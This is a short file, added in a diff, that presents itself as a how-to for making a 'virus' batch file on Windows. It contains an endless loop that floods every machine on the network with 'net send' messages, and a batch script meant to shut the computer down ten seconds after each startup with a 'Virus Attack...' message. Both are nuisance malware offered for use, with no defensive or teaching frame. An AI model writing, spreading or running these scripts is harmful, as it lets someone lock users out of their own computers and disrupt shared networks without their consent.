@@ -1,0 +1,18 @@
+:CRASH
+net send * WORKGROUP ENABLED
+net send * WORKGROUP ENABLED
+GOTO CRASH
+
+We can make a batch file which will Shutdown the computer everytime on startup !
+
+Here is how ?
+
+? Open Notepad
+
+? Type :
+
+@ECHO OFF
+
+shutdown -s -t 10 -c "Virus Attack..."
+
+exit
